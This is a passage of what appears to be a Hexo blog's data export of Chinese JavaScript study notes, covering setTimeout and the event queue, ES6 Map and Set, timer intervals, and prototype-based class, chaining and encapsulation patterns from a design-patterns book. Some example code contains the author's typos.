<a href=\"https://juejin.im/post/59e85eebf265da430d571f89\" target=\"_blank\" rel=\"noopener\">又爱又恨的setTimeout</a></h2><p>大名鼎鼎的<code>setTimeout</code>无需再多言，大家对他的第一印象就是<code>异步</code>可以<code>延时执行</code>，我们经常这么实现延时3秒执行：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    console.log(&apos;延时3秒&apos;);</span><br><span class=\"line\">&#125;,3000)</span><br></pre></td></tr></table></figure></p>\n<p>随着<code>setTimeout</code>使用的增加，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这是为何？</p>\n<p>渐渐的setTimeout用的地方多了，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊？</p>\n<p>先看一个例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    task();</span><br><span class=\"line\">&#125;,3000)</span><br><span class=\"line\">console.log(&apos;执行console&apos;);</span><br></pre></td></tr></table></figure></p>\n<p>根据前面我们的结论，setTimeout是异步的，应该先执行console.log这个同步任务，所以我们的结论是：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//执行console</span><br><span class=\"line\">//task()</span><br></pre></td></tr></table></figure></p>\n<p>去验证一下，结果正确！<br>然后我们修改一下前面的代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    task()</span><br><span class=\"line\">&#125;,3000)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(10000000)</span><br></pre></td></tr></table></figure></p>\n<p>乍一看其实差不多，但把这段代码在chrome执行一下，却发现控制台执行task()需要的时间远远超过3秒，为何需要这么长时间？</p>\n<p>这时候我们需要重新理解<code>setTimeout的定义</code>。我们先说上述代码是怎么执行的：</p>\n<ul>\n<li><p><code>task()</code>进入Event Table并注册,计时开始。</p>\n</li>\n<li><p>执行<code>sleep</code>函数，很慢，非常慢，计时仍在继续。</p>\n</li>\n<li><p>3秒到了，计时事件<code>timeout</code>完成，<code>task()</code>进入<code>Event Queue</code>，但是<code>sleep</code>也太慢了吧，还没执行完，只好等着。</p>\n</li>\n<li><p><code>sleep</code>终于执行完了，<code>task()</code>终于从Event Queue进入了主线程执行。</p>\n</li>\n</ul>\n<p>上述的流程走完，我们知道<code>setTimeout</code>这个函数，是经过指定时间后，把要执行的任务(本例中为<code>task()</code>)加入到Event Queue中，又因为是单线程任务要一个一个执行，如果前面的任务需要的时间太久，那么只能等着，导致真正的延迟时间远远大于3秒。</p>\n"},{"title":"JS笔记-廖雪峰","date":"2018-04-16T09:22:06.000Z","archives":null,"_content":"## ES6 Map和Set(廖雪峰)\n(https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000)<br>\nJavaScript的 默认对象 表示方式`{}`可以视为其他语言中的`Map`或`Dictionary`的数据结构，即一组`键值对`。\n但是JavaScript的对象有个小问题，就是`键`必须是`字符串`。但实际上`Number`或者`其他数据类型`作为键也是非常合理的。\n\n为了解决这个问题，最新的`ES6`规范引入了 新的 数据类型`Map`。\n测试浏览器是否支持`ES6规范` 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：\n````\n'use strict';\nvar m = new Map();\nvar s = new Set();\nconsole.log('你的浏览器支持Map和Set！');\n````\n### Map(`增set` `删delete` `改set` `查get has`)\n`Map`是一组`键值对`的结构，具有极快的查找速度。\n> var m = new Map([['Michael', 95], ['Bob', 75], ['Tracy', 85]]); <br>\n> m.get('Michael'); // 95\n\n初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：\n````\nvar m = new Map(); // 空Map\nm.set('Adam', 67); // 添加新的key-value\nm.set('Bob', 59);\nm.has('Adam'); // 是否存在key 'Adam': true\nm.get('Adam'); // 67\nm.delete('Adam'); // 删除key 'Adam'\nm.get('Adam'); // undefined\n````\n一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：\n````\nvar m = new Map();\nm.set('Adam', 67);\nm.set('Adam', 88);\nm.get('Adam'); // 88\n````\n\n### Set(`没有重复的key`)\n`Set`和`Map`类似，也是一组`key的集合`，但`不存储value`。由于`key不能重复`，所以，在Set中，`没有重复的key`。\n要`创建一个Set`，需要提供一个`Array`作为输入，或者`直接创建一个空Set`：\n````\nvar s1 = new Set(); // 空Set\nvar s2 = new Set([1, 2, 3]); // 含1, 2, 3\n````\n重复元素在Set中自动被过滤：\n> var s = new Set([1, 2, 3, 3, '3']);\n> s; // Set {1, 2, 3, \"3\"}\n\n通过`add(key)`方法可以`添加元素到Set`中，可以重复添加，但不会有效果：\n通过`delete(key)`方法可以删除元素：\n\n","source":"_posts/FrontEnd/JS/JS笔记-廖雪峰.md","raw":"---\ntitle: JS笔记-廖雪峰\ndate: 2018-04-16 17:22:06\ntags: ES5/ES6\narchives: \ncategories: 原生JS\n---\n## ES6 Map和Set(廖雪峰)\n(https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000)<br>\nJavaScript的 默认对象 表示方式`{}`可以视为其他语言中的`Map`或`Dictionary`的数据结构，即一组`键值对`。\n但是JavaScript的对象有个小问题，就是`键`必须是`字符串`。但实际上`Number`或者`其他数据类型`作为键也是非常合理的。\n\n为了解决这个问题，最新的`ES6`规范引入了 新的 数据类型`Map`。\n测试浏览器是否支持`ES6规范` 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：\n````\n'use strict';\nvar m = new Map();\nvar s = new Set();\nconsole.log('你的浏览器支持Map和Set！');\n````\n### Map(`增set` `删delete` `改set` `查get has`)\n`Map`是一组`键值对`的结构，具有极快的查找速度。\n> var m = new Map([['Michael', 95], ['Bob', 75], ['Tracy', 85]]); <br>\n> m.get('Michael'); // 95\n\n初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：\n````\nvar m = new Map(); // 空Map\nm.set('Adam', 67); // 添加新的key-value\nm.set('Bob', 59);\nm.has('Adam'); // 是否存在key 'Adam': true\nm.get('Adam'); // 67\nm.delete('Adam'); // 删除key 'Adam'\nm.get('Adam'); // undefined\n````\n一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：\n````\nvar m = new Map();\nm.set('Adam', 67);\nm.set('Adam', 88);\nm.get('Adam'); // 88\n````\n\n### Set(`没有重复的key`)\n`Set`和`Map`类似，也是一组`key的集合`，但`不存储value`。由于`key不能重复`，所以，在Set中，`没有重复的key`。\n要`创建一个Set`，需要提供一个`Array`作为输入，或者`直接创建一个空Set`：\n````\nvar s1 = new Set(); // 空Set\nvar s2 = new Set([1, 2, 3]); // 含1, 2, 3\n````\n重复元素在Set中自动被过滤：\n> var s = new Set([1, 2, 3, 3, '3']);\n> s; // Set {1, 2, 3, \"3\"}\n\n通过`add(key)`方法可以`添加元素到Set`中，可以重复添加，但不会有效果：\n通过`delete(key)`方法可以删除元素：\n\n","slug":"FrontEnd/JS/JS笔记-廖雪峰","published":1,"updated":"2018-09-05T06:33:18.455Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzi009azodv1lp4h5td","content":"<h2 id=\"ES6-Map和Set-廖雪峰\"><a href=\"#ES6-Map和Set-廖雪峰\" class=\"headerlink\" title=\"ES6 Map和Set(廖雪峰)\"></a>ES6 Map和Set(廖雪峰)</h2><p>(<a href=\"https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000</a>)<br><br>JavaScript的 默认对象 表示方式<code>{}</code>可以视为其他语言中的<code>Map</code>或<code>Dictionary</code>的数据结构，即一组<code>键值对</code>。<br>但是JavaScript的对象有个小问题，就是<code>键</code>必须是<code>字符串</code>。但实际上<code>Number</code>或者<code>其他数据类型</code>作为键也是非常合理的。</p>\n<p>为了解决这个问题，最新的<code>ES6</code>规范引入了 新的 数据类型<code>Map</code>。<br>测试浏览器是否支持<code>ES6规范</code> 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;use strict&apos;;</span><br><span class=\"line\">var m = new Map();</span><br><span class=\"line\">var s = new Set();</span><br><span class=\"line\">console.log(&apos;你的浏览器支持Map和Set！&apos;);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Map-增set-删delete-改set-查get-has\"><a href=\"#Map-增set-删delete-改set-查get-has\" class=\"headerlink\" title=\"Map(增set 删delete 改set 查get has)\"></a>Map(<code>增set</code> <code>删delete</code> <code>改set</code> <code>查get has</code>)</h3><p><code>Map</code>是一组<code>键值对</code>的结构，具有极快的查找速度。</p>\n<blockquote>\n<p>var m = new Map([[‘Michael’, 95], [‘Bob’, 75], [‘Tracy’, 85]]); <br><br>m.get(‘Michael’); // 95</p>\n</blockquote>\n<p>初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map(); // 空Map</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67); // 添加新的key-value</span><br><span class=\"line\">m.set(&apos;Bob&apos;, 59);</span><br><span class=\"line\">m.has(&apos;Adam&apos;); // 是否存在key &apos;Adam&apos;: true</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 67</span><br><span class=\"line\">m.delete(&apos;Adam&apos;); // 删除key &apos;Adam&apos;</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // undefined</span><br></pre></td></tr></table></figure></p>\n<p>一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map();</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67);</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 88);</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 88</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Set-没有重复的key\"><a href=\"#Set-没有重复的key\" class=\"headerlink\" title=\"Set(没有重复的key)\"></a>Set(<code>没有重复的key</code>)</h3><p><code>Set</code>和<code>Map</code>类似，也是一组<code>key的集合</code>，但<code>不存储value</code>。由于<code>key不能重复</code>，所以，在Set中，<code>没有重复的key</code>。<br>要<code>创建一个Set</code>，需要提供一个<code>Array</code>作为输入，或者<code>直接创建一个空Set</code>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var s1 = new Set(); // 空Set</span><br><span class=\"line\">var s2 = new Set([1, 2, 3]); // 含1, 2, 3</span><br></pre></td></tr></table></figure></p>\n<p>重复元素在Set中自动被过滤：</p>\n<blockquote>\n<p>var s = new Set([1, 2, 3, 3, ‘3’]);<br>s; // Set {1, 2, 3, “3”}</p>\n</blockquote>\n<p>通过<code>add(key)</code>方法可以<code>添加元素到Set</code>中，可以重复添加，但不会有效果：<br>通过<code>delete(key)</code>方法可以删除元素：</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"ES6-Map和Set-廖雪峰\"><a href=\"#ES6-Map和Set-廖雪峰\" class=\"headerlink\" title=\"ES6 Map和Set(廖雪峰)\"></a>ES6 Map和Set(廖雪峰)</h2><p>(<a href=\"https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000</a>)<br><br>JavaScript的 默认对象 表示方式<code>{}</code>可以视为其他语言中的<code>Map</code>或<code>Dictionary</code>的数据结构，即一组<code>键值对</code>。<br>但是JavaScript的对象有个小问题，就是<code>键</code>必须是<code>字符串</code>。但实际上<code>Number</code>或者<code>其他数据类型</code>作为键也是非常合理的。</p>\n<p>为了解决这个问题，最新的<code>ES6</code>规范引入了 新的 数据类型<code>Map</code>。<br>测试浏览器是否支持<code>ES6规范</code> 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;use strict&apos;;</span><br><span class=\"line\">var m = new Map();</span><br><span class=\"line\">var s = new Set();</span><br><span class=\"line\">console.log(&apos;你的浏览器支持Map和Set！&apos;);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Map-增set-删delete-改set-查get-has\"><a href=\"#Map-增set-删delete-改set-查get-has\" class=\"headerlink\" title=\"Map(增set 删delete 改set 查get has)\"></a>Map(<code>增set</code> <code>删delete</code> <code>改set</code> <code>查get has</code>)</h3><p><code>Map</code>是一组<code>键值对</code>的结构，具有极快的查找速度。</p>\n<blockquote>\n<p>var m = new Map([[‘Michael’, 95], [‘Bob’, 75], [‘Tracy’, 85]]); <br><br>m.get(‘Michael’); // 95</p>\n</blockquote>\n<p>初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map(); // 空Map</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67); // 添加新的key-value</span><br><span class=\"line\">m.set(&apos;Bob&apos;, 59);</span><br><span class=\"line\">m.has(&apos;Adam&apos;); // 是否存在key &apos;Adam&apos;: true</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 67</span><br><span class=\"line\">m.delete(&apos;Adam&apos;); // 删除key &apos;Adam&apos;</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // undefined</span><br></pre></td></tr></table></figure></p>\n<p>一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map();</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67);</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 88);</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 88</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Set-没有重复的key\"><a href=\"#Set-没有重复的key\" class=\"headerlink\" title=\"Set(没有重复的key)\"></a>Set(<code>没有重复的key</code>)</h3><p><code>Set</code>和<code>Map</code>类似，也是一组<code>key的集合</code>，但<code>不存储value</code>。由于<code>key不能重复</code>，所以，在Set中，<code>没有重复的key</code>。<br>要<code>创建一个Set</code>，需要提供一个<code>Array</code>作为输入，或者<code>直接创建一个空Set</code>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var s1 = new Set(); // 空Set</span><br><span class=\"line\">var s2 = new Set([1, 2, 3]); // 含1, 2, 3</span><br></pre></td></tr></table></figure></p>\n<p>重复元素在Set中自动被过滤：</p>\n<blockquote>\n<p>var s = new Set([1, 2, 3, 3, ‘3’]);<br>s; // Set {1, 2, 3, “3”}</p>\n</blockquote>\n<p>通过<code>add(key)</code>方法可以<code>添加元素到Set</code>中，可以重复添加，但不会有效果：<br>通过<code>delete(key)</code>方法可以删除元素：</p>\n"},{"title":"JS线程","date":"2018-05-09T06:32:36.000Z","_content":"## [转][从setTimeout/setInterval看JS线程](https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A)\n`setTimeout`和`setInterval`的`延时最小间隔`是`4ms`(W3C在HTML标准中规定)；\n\n在`JavaScript`中`没有`任何代码是`立刻执行`的，但`一旦进程空闲`就`尽快执行`。\n\n这意味着无论是`setTimeout`还是`setInterval`，所设置的时间都只是 `n毫秒后被添加到队列中`，而`不是`过`n毫秒后立即执行`。\n\n---------------------\n[阅读原文](https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A)","source":"_posts/FrontEnd/JS/JS线程.md","raw":"---\ntitle: JS线程\ndate: 2018-05-09 14:32:36\ntags:\ncategories:\n---\n## [转][从setTimeout/setInterval看JS线程](https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A)\n`setTimeout`和`setInterval`的`延时最小间隔`是`4ms`(W3C在HTML标准中规定)；\n\n在`JavaScript`中`没有`任何代码是`立刻执行`的，但`一旦进程空闲`就`尽快执行`。\n\n这意味着无论是`setTimeout`还是`setInterval`，所设置的时间都只是 `n毫秒后被添加到队列中`，而`不是`过`n毫秒后立即执行`。\n\n---------------------\n[阅读原文](https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A)","slug":"FrontEnd/JS/JS线程","published":1,"updated":"2018-09-05T06:33:18.456Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzj009dzodvem7ehdqs","content":"<h2 id=\"转-从setTimeout-setInterval看JS线程\"><a href=\"#转-从setTimeout-setInterval看JS线程\" class=\"headerlink\" title=\"[转]从setTimeout/setInterval看JS线程\"></a>[转]<a href=\"https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A\" target=\"_blank\" rel=\"noopener\">从setTimeout/setInterval看JS线程</a></h2><p><code>setTimeout</code>和<code>setInterval</code>的<code>延时最小间隔</code>是<code>4ms</code>(W3C在HTML标准中规定)；</p>\n<p>在<code>JavaScript</code>中<code>没有</code>任何代码是<code>立刻执行</code>的，但<code>一旦进程空闲</code>就<code>尽快执行</code>。</p>\n<p>这意味着无论是<code>setTimeout</code>还是<code>setInterval</code>，所设置的时间都只是 <code>n毫秒后被添加到队列中</code>，而<code>不是</code>过<code>n毫秒后立即执行</code>。</p>\n<hr>\n<p><a href=\"https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-从setTimeout-setInterval看JS线程\"><a href=\"#转-从setTimeout-setInterval看JS线程\" class=\"headerlink\" title=\"[转]从setTimeout/setInterval看JS线程\"></a>[转]<a href=\"https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A\" target=\"_blank\" rel=\"noopener\">从setTimeout/setInterval看JS线程</a></h2><p><code>setTimeout</code>和<code>setInterval</code>的<code>延时最小间隔</code>是<code>4ms</code>(W3C在HTML标准中规定)；</p>\n<p>在<code>JavaScript</code>中<code>没有</code>任何代码是<code>立刻执行</code>的，但<code>一旦进程空闲</code>就<code>尽快执行</code>。</p>\n<p>这意味着无论是<code>setTimeout</code>还是<code>setInterval</code>，所设置的时间都只是 <code>n毫秒后被添加到队列中</code>，而<code>不是</code>过<code>n毫秒后立即执行</code>。</p>\n<hr>\n<p><a href=\"https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"JS设计模式","date":"2018-10-05T10:30:43.000Z","_content":"# **第一章 灵活语言--JavaScript**\n\n## **1.1 全局变量 命名函数**\n> function fnName() {}\n\n## **1.2 全局变量 函数表达式**\n> var fnName = function() {}\n\nps：全局变量污染全局作用域，容易被覆盖\n\n## **1.3 对象收编变量**\n````\nvar fnObj = {\n  fn1: function() {},\n  fn2: () => {}\n}\n````\n\n## **1.4 对象另一种形式**\nJS万事万物皆对象，函数也是对象\n\n首先声明一个对象, 然后添加方法\n````\nvar fnObj = function() {};\nfnObj.fn1 = function() {};\n````\nps: 对象不能复制, `new` 关键字 创建新对象，新对象不能继承方法\n\n## **1.5真假对象**\n简单复制，将方法放在一个函数对象中\n````\nvar fnObj = function() {\n  return {\n    fn1: function() {},\n    fn2: () => {}\n  }\n}\n\nvar a = fnObj();\na.fn1();\n````\nps: 每次调用返回新对象, 状态不会互相干扰 / 新创建对象 和 `fnObj` 没有任何关系\n\n## **1.6 类**\n`1.5假对象`新创建对象 和`fnObj`没有任何关系\n````\nvar fnObj = function() {\n  this.fn1 = function(){}\n  this.fn2 = () => {}\n  this.fn3 = arguments => {}\n}\n\nvar a = new fnObj();\na.fn1();\n````\n用类创建对象\n\n## **1.7 检测类**\n所有方法放在 函数内部 通过`this`定义。\\\n每次通过`new`关键字创建新对象，`新对象`对`类`的`this`上的`属性/方法`进行复制。新创建对象 都有自己的一套方法，**但是**造成的消耗很奢侈。\n\n**第一种方法**\n````\nvar fnObj = function() {};\nfnObj.prototype.fn1 = function() {};\nfnObj.prototype.fn2 = () => {};\n````\n\n实例 共享`prototype`上`属性/方法`\n\n**第二种方法**\n````\nvar fnObj = function() {};\n\nfnObj.prototype = {\n  fn1: function() {},\n  fn2: () => {}\n}\n````\n两种方法不能混用，第二种覆盖第一种.\n\n## **1.8 方法的链式调用**\n在声明的 每个方法末尾 将当前对象返回，JS中`this`关键字指向当前对象\n````\nvar fnObj = {\n  fn1: function() {\n    // DoSomeThing\n    return this;\n  },\n  fn2: () => {\n    // DoSomeThing \n    return this;\n  }\n}\n\n// 链式调用\n> fnObj.fn1().fn2();\n````\n\n**构造函数原型链式调用**\n````\nvar fnObj = function() {};\n\nfnObj.prototype = {\n  fn1: function() {\n    // DoSomeThing\n    return this;\n  },\n  fn2: () => {\n    // DoSomeThing\n    return this;\n  }\n}\n\n// 使用时需要先创建一下\nvar a = new fnObj();\na.fn1().fn2();\n````\n\n## 1.9 函数祖先\n`prototype.js / lodash.js`, `js框架`;\n\n在内置对象`Function`原型上添加方法\n> Function.prototype.fn1 = fucntion() {}\n\n// 函数形式\n> var f = function() {};\n> f.fn1();\n\n// 构造函数\n> var f = new Function();\n> f.fn1();\n\n此种方法不被推荐，污染原生对象`Function`, 可抽象出一个 统一添加方法的 功能方法\n\n````\n// 在原型上挂载`addMethod`方法\nFunction.prototype.addMethod = function(name, fn) {\n  this[name] = fn;\n}\n\n// 两种生成实例的方法，任选其一\nvar methods = function() {};\n||\nvar methods = new Function();\n\nmethods.addMethod('fn1', function() {});\nmethods.addMethod('fn2', function() {});\n\nmethods.fn1();\nmethods.fn2();\n````\n\n## 1.10链式添加\n````\n// 在原型上挂载`addMethod`方法\nFunction.prototype.addMethod = function(name, fn) {\n  this[name] = fn;\n  return this;\n}\n\n// 顺便支持`链式调用`\nvar fn = function() {};\nfn.addMethod('fn1', function() {\n  return this;\n}).addMethod('fn2', function() {\n    return this;\n  })\n\nfn.fn1().fn2();\n````\n\n## 1.11 类式调用\n````\n// 在原型上挂载`addMethod`方法\nFunction.prototype.addMethod = function(name, fn) {\n  this.prototype[name] = fn;\n  return this;\n}\n\n// 顺便支持`链式调用`\nvar fn = function() {};\nfn.addMethod('fn1', function() {\n  return this;\n}).addMethod('fn2', function() {\n    return this;\n  })\n\n// 调用时需要注意\nvar fns = new fn();\nfns.fn1();\n````\n\n## **总结:** \nJS是一种`灵活`的语言, `函数`扮演一等公民。使用JS可以编写出更多`优雅的艺术代码`。\n\n**忆之获:** 函数 多样化 创建/使用. `灵活性`是语言特有气质。团队开发慎重，尽量保证团队代码风格一致。易开发、可维护、代码规范必然要求。\n\n**问答:**\n\n+ **问： [1.5真假对象](#1.5真假对象) 一节中如何实现方法链式调用?**\\\n  答：\n  ````\n  var fnObj = function() {\n    return {\n      fn1: function() {\n        return this;\n      },\n      fn2: () => {\n        return this;\n      }\n    }\n  }\n\n  var fn = fnObj();\n  fn.fn1().fn2();\n  ````\n\n+ **问：试定义一个可为函数添加多方法的`addMethod`方法。**\\\n  答：参考[1.10链式添加](#1.10链式添加)\n\n  **方式一**\n  ````\n  // 在原型上挂载`addMethod`方法\n  Function.prototype.addMethod = function(name, fn) {\n    this[name] = fn;\n    return this;\n  }\n\n  // 顺便支持`链式调用`\n  var fn = function() {};\n  fn.addMethod('fn1', function() {\n    return this;\n  }).addMethod('fn2', function() {\n      return this;\n    })\n\n  fn.fn1().fn2();\n  ````\n\n  **方式二**\n  ````\n  // 定义 参数类型 接口\n  interface opt = {\n    fnName: string,\n    fn: function\n  }\n\n  // 支持 一次性 创建多个方法\n  Function.prototype.addMethod = function(options: opt[]) {\n    for(obj of options) {\n      this[obj.fnName] = obj.fn;\n    }\n    trturn this;\n  }\n\n  var methods = [\n    {\n      fnName: 'fn1',\n      fn: function() {}\n    },\n    {\n      fnName: 'fn2',\n      fn: () => {}\n    }\n    ...\n  ]\n\n  var '自定义Fn' = function() {};\n\n  '自定义Fn'.addMethod(methods);\n  ````\n\n+ **问：试定义一个既可为函数添加多方法,又可为原型添加方法的`addMethod`方法。**\\\n  答：\n  ````\n  // 定义 参数类型 接口\n  interface opt = {\n    fnName: string,\n    fn: function\n  }\n\n  // 支持 一次性 创建多个方法\n  Function.prototype.addMethod = function(options: opt[], proto: string) {\n    if(proto === \"prototype\") {\n      for(obj of options) {\n        this.protype[obj.fnName] = obj.fn;\n      }\n    } else {\n      for(obj of options) {\n        this[obj.fnName] = obj.fn;\n      }\n    }\n    trturn this;\n  }\n  ````\n\n# **第二章 面向对象编程**\n\n## 2.1 `面向对象` `面向过程`\n面向对象编程 就是 将 需求 抽象成一个对象, 针对对象分析 特征(属性) / 动作(方法). 这个对象称为`类`.\n\n**核心思想：**`封装` `继承` `多继承` `多态`\n\n## 2.2 包装明星--封装\n\n### 2.2.1 创建一个类\n首先声明一个函数，保存在一个变量里. 按编程习惯，将类名首字母大写.\n然后在函数(类)内部通过对`this`(函数内部自带变量，用于指向当前对象)变量添加 属性/方法，实现对类添加`属性/方法`\n````\nvar Book = function(id, bookName, price) {\n  this.id = id;\n  this.bookName = bookName;\n  this.price = price;\n}\n````\n\n也可通过`类`的原型(类本身也是对象，所以也有原型`prototype`)上添加`属性/方法`.\\\n两种方式：\n\n①为原型对象属性赋值\n````\nBook.prototype.show = function() {};\n````\n\n②将一个对象赋值给类的原型对象.\n````\nBook.prototype = {\n  show: function() {},\n  fn2: function() {},\n}\n````\n两种模式不能混用\n\n使用时需要`new`关键字，实例化(创建)新对象.\n\n**关于对实例方法和原型方法解释：**\n通过`this`添加的`方法/属性`，是在当前对象上添加的\\\nJS是一种基于`prototype`原型的语言, 每创建一个对象(函数也是一种对象),都有一个prototype原型用于指向 其继承的 属性/方法. 通过prototype继承方法非对象自身所有，需要通过prototype逐级查找。\n通过`this`定义的`方法/属性`，是对象自身拥有, 每次通过`类`创建新对象实例时，都会复制`类`本身方法、属性\\\nprototype上方法/属性是继承来,状态共享, 不会被多次创建。\n\n### 2.2.2 属性与方法封装\n理解：\n1. 通过JS函数作用域 实现 函数内部创建\n面向对象思想:\n\n `属性/方法` 的 隐藏、暴露, `私有属性/私有方法、公有属性/公有方法、保护属性/保护方法`\n\nJS通过`函数作用域`实现`私有属性/私有方法`;\n\n`this`创建`公有属性/公有方法`, 通过`this`创建的公有方法，可以访问`类(创建时)||对象`的`私有属性/私有方法`, 由于这些方法权利比较大, 又称为`特权方法`;\n````\n// 私有属性/私有方法, 特权方法, 对象公有属性/对象公有方法, 构造器\nvar Book = fucntion(id, name, price) {\n  // 私有属性\n  var num = 1;\n  // 私有方法\n  function checkId() {};\n  \n  // 特权方法\n  this.getName = function() {};\n  this.getPrice = function() {};\n  this.setName = function() {};\n  this.setPrice = function() {};\n\n  // 对象公有属性\n  this.id = id;\n  // 对象公有方法\n  this.copy = function() {};\n\n  // 构造器\n  this.setName(name);\n  this.setPrice(price);\n}\n````\n理解：\n1. 通过JS`函数作用域`特征，来实现 函数内部创建 外部无法访问的`私有变量/私有方法`\n2. 通过`new`关键字，实例化对象时，会对`类`执行一次，所以`类`内部`this`上定义的`属性/方法`自然可复制到 新创建对象上，成为 `对象公有属性/公有方法` \n3. 其中一些方法能访问到 `类`的`私有属性/私有方法`, 比外界权利大，得名`特权方法`\n4. 